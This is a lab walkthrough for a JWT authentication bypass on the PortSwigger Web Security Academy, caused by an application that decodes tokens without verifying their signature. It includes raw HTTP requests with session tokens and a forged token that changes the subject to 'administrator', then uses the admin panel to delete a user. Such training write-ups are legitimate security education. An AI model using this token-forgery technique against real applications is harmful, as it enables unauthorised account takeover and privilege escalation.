# JWT authentication bypass via unverified signature

## Lab Description :
![Cap dashboard screenshot](jwt-level-1-1.png)

## Overview :
JWT libraries typically provide one method for verifying tokens and another that just decodes them. For example, the Node.js library jsonwebtoken has verify() and decode().

Occasionally, developers confuse these two methods and only pass incoming tokens to the decode() method. This effectively means that the application doesn't verify the signature at all.

## Solution :
Login to the website as wiener using the provided credentials.

In the HTTP history tab we can see 3 requests have been highlighted as it has JWT.

![Cap dashboard screenshot](jwt-level-1-2.png)

Send the GET request to the uri /my-account?id=wiener to repeater. Since it is the request that identifies the user.
```html
GET /my-account?id=wiener HTTP/2
Host: 0aef00060493cca0807926f7003e00e9.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0aef00060493cca0807926f7003e00e9.web-security-academy.net/login
Connection: keep-alive
Cookie: session=eyJraWQiOiI3ZTUzNjY5MS00MGQ4LTQ3MGUtYTdkZC1kMWYxYTg5ZmYwZGUiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY5NTYyNzI4OH0.llpcQqdSn9hrRmaHEa-tkzGWfXBaiSTOZmaJSyx2_iRuWOXpLP3BdhL71DiqMvZJw9hYUhZKjAhRWhRS7glXTP6mFn6haB-9icqGC7uRcCrPfBMLlVX9bp9l63qnvgkLsRu6VuonPAtfa7zSC1IVW8kUnZ13nQIz90OCKybsznObTxNBCllTaE_FOJRFxkxaLd7L_zZmR_1EvFyLjHfE3D3T2uahWyEGizwmmgl8SA8A26gOQL9RmTZcQ3QCEgXbJnZkbKhKnj3ccNnQRgmYGnpmCBgc9gVk_RZfZEKjujUMukIXAjdOyEhYH7_qz716xbLZWWzzY7hhepeCCYa5EQ
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
```
Use jwt.io to decode the header and payload to decode the JWT token.

Header -
```
{
  "kid": "4d37d562-2a93-4029-9e59-72f3c02cf736",
  "alg": "RS256"
}
Payload -

{
  "iss": "portswigger",
  "sub": "wiener",
  "exp": 1695631409
}
```

In the JSON WEB TOKEN tab, change the value of sub from wiener to administrator & click sign.

The following dialog box appears,

![Cap dashboard screenshot](jwt-level-1-3.png)

Just hit OK & we'll get a new JWT token.

``eyJraWQiOiI0ZDM3ZDU2Mi0yYTkzLTQwMjktOWU1OS03MmYzYzAyY2Y3MzYiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6ImFkbWluaXN0cmF0b3IiLCJleHAiOjE2OTU2MzE0MDl9.XdAQXkCJZrTXRGbNM6_p8wRSHJNl2ZBf4F8RvVyB0lQ`` Replace this token with the one that is already present in the request & send it.

Now we can see a link to Admin panel.

![Cap dashboard screenshot](jwt-level-1-4.png)

But when we enter the admin panel , the token is again replaced with wiener's so we are restricted to access the admin panel at /admin.
```html
GET /admin HTTP/2
Host: 0ab500ca04aad84980df9e730012000a.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: https://0ab500ca04aad84980df9e730012000a.web-security-academy.net/login
Cookie: session=eyJraWQiOiI0ZDM3ZDU2Mi0yYTkzLTQwMjktOWU1OS03MmYzYzAyY2Y3MzYiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY5NTYzMTQwOX0.TbV3LMDgUPu62MiIJu7nniNJl7GUu5M8h0paaJsbLydgHmyBgYYXOy8Z5jLXWpK8DVMDpI-v4PKBo6hNQqocX2NODEOotnhO1WdaXWAaPg2J3N-UPAHHvz53rH3Iu97JzLztJFje_-KpDnQ43RaGBwMWy_zPO0jtW3w-aXQlv5kks4WZZTADVl1J0YDu6OWIg88cquIoLLHavTBIB7VZWMVVnpqadaXUpbzYvCptJOpV13ozTSbBz_ZuPa0NPrxzR91_rDJJCDKv6lxxrFus4rVCoZQv-CvRqanL736ZG7ptHkhTP527oqVssCkSKy79eZSGvhWuhPIgnZz1nec5pA
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
```

![Cap dashboard screenshot](jwt-level-1-5.png)

Repeat the same process by replacing the JWT token with the one which we newly created & forward the request.

Delete the user carlos to solve the lab.

![Cap dashboard screenshot](jwt-level-1-6.png)

#### Visit The Next Page For The Next Level :)
